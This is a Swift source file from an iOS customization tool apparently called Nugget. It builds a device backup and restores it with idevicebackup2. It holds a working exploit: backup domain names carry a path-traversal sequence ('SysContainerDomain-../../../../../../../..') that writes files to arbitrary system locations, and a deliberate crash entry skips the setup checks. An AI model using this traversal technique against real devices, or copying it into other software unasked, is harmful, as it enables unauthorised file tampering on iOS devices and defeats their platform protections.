//
//  Restore.swift
//  Nugget
//
//  Created by lemin on 9/11/24.
//

import Foundation

struct FileToRestore {
    let contents: Data
    let path: String
    var owner: Int32 = 501
    var group: Int32 = 501
}

class RestoreManager {
    static let shared = RestoreManager()
    
    private func addExploitedConcreteFile(list: inout [BackupFile], path: String, contents: Data, owner: Int32 = 501, group: Int32 = 501) {
        let url = URL(filePath: path)
        var basePath: String = "/var/backup"
        if #available(iOS 17, *) {
            // required on iOS 17.0+ since /var/mobile is on a separate partition
            basePath = url.path(percentEncoded: false).hasPrefix("/var/mobile/") ? "/var/mobile/backup" : "/var/backup"
        }
        
        list.append(Directory(path: "", domain:
            /*
             * /var/.backup.i/var/root/Library/Bacdskup/SystemContainers/
             */
            "SysContainerDomain-../../../../../../../..\(basePath)\(url.deletingLastPathComponent().path(percentEncoded: false))", owner: owner, group: group))
        list.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../..\(basePath)\(url.path(percentEncoded: false))", contents: contents, owner: owner, group: group))
    }
    
    private func addRegularConcreteFile(list: inout [BackupFile], path: String, contents: Data, owner: Int32 = 501, group: Int32 = 501, last_path: inout String, last_domain: inout String) {
        let path_items = path.components(separatedBy: "/")
        guard path_items.count > 0 else { return }
        let domain = path_items[0]
        let same_path: Bool = last_path != "" && last_domain != "" && path.starts(with: "\(last_domain)/\(last_path)")
        if same_path {
            // only need to add the file
            list.append(ConcreteFile(path: path.replacingOccurrences(of: "\(domain)/", with: ""), domain: domain, contents: contents, owner: owner, group: group))
            return
        }
        list.append(Directory(path: "", domain: domain))
        last_domain = domain
        var full_path = ""
        for i in 1...(path_items.count - 1) {
            if full_path != "" {
                full_path += "/"
            }
            full_path += path_items[i]
            if i < path_items.count - 1 {
                last_path = full_path
                // it is a directory
                list.append(Directory(path: full_path, domain: domain))
            } else {
                // it is a file
                list.append(ConcreteFile(path: full_path, domain: domain, contents: contents, owner: owner, group: group))
            }
        }
    }
    
    func restoreFiles(_ files: [FileToRestore], reboot: Bool = false) {
        // get the device and create a directory for the backup files
        let deviceList = MobileDevice.deviceList()
        var udid: String
        guard deviceList.count == 1 else {
            print("Invalid device count: \(deviceList.count)")
            return
        }
        
        udid = deviceList.first!
//        let udid = "5234253"
        
        let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let folder = documentsDirectory.appendingPathComponent(udid, conformingTo: .data)
        
        do {
            try? FileManager.default.removeItem(at: folder)
            try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: false)
            
            // sort the file domains
            let sortedFiles = files.sorted { file1, file2 in
                // move exploited files to the back
                if file1.path.starts(with: "/") && !file2.path.starts(with: "/") {
                    return false
                } else if !file1.path.starts(with: "/") && file2.path.starts(with: "/") {
                    return true
                }
                return file1.path < file2.path
            }
            
            var backupFiles: [BackupFile] = []
            var last_path: String = ""
            var last_domain: String = ""
            for file in sortedFiles {
                // for non exploit domains, the path will not start with /
                if !file.path.starts(with: "/") {
                    // file is a regular domain, does not utilize exploit
                    addRegularConcreteFile(list: &backupFiles, path: file.path, contents: file.contents, owner: file.owner, group: file.group, last_path: &last_path, last_domain: &last_domain)
                } else {
                    // file utilizes exploit
                    addExploitedConcreteFile(list: &backupFiles, path: file.path, contents: file.contents, owner: file.owner, group: file.group)
                }
            }
            // crash on purpose to skip setup
            backupFiles.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data(), owner: 501, group: 501))
            
            // create backup
            let mbdb = Backup(files: backupFiles)
            try mbdb.writeTo(directory: folder)
            
            // Restore now
            let restoreArgs = [
                "idevicebackup2",
                "-n", "restore", "--no-reboot", "--system",
                documentsDirectory.path(percentEncoded: false)
            ]
            print("Executing args: \(restoreArgs)")
            var argv = restoreArgs.map{ strdup($0) }
            let result = idevicebackup2_main(Int32(restoreArgs.count), &argv)
            print("idevicebackup2 exited with code \(result)")
            if reboot {//}, let result = result as? Int, result == 0 {
                print("Rebooting device...")
                MobileDevice.rebootDevice(udid: udid)
            }
        } catch {
            print(error.localizedDescription)
            return
        }
    }
}
